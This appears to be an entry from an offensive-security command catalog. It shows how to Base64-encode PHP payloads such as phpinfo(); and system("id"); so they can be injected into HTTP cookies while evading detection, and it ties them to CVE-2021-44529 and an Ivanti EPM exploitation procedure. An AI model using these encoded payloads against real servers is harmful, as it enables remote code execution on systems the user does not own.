---
id: cmd-base64-php
data: echo -n 'phpinfo();' | base64
tags:
  - encoding
  - php
  - injection
type: command
output: cGhwaW5mbygpOw==
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:41.106Z'
verified: false
validated: true
submitted: true
---
# base64-encode-php

## Command

```bash
echo -n 'phpinfo();' | base64
```

## Description

This command Base64-encodes a PHP payload like phpinfo(); for injection into HTTP cookies, evading basic detection in web vulnerability exploitation such as CVE-2021-44529.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `phpinfo();` | The PHP code to encode (replace with arbitrary code) | Yes |
| `-n` | Suppress trailing newline in echo | Yes |

## Examples

### Basic Usage

```bash
echo -n 'phpinfo();' | base64
```

### Advanced Usage

```bash
echo -n 'system("id");' | base64
```

## Expected Output

Base64-encoded string, e.g., `cGhwaW5mbygpOw==` for phpinfo();. Use this directly in cookie values.

## Related

- [[commands/curl-inject-php-cookie]]
- [[procedures/Exploit-Ivanti-EPM-CSA-Code-Injection-via-Cookies]]
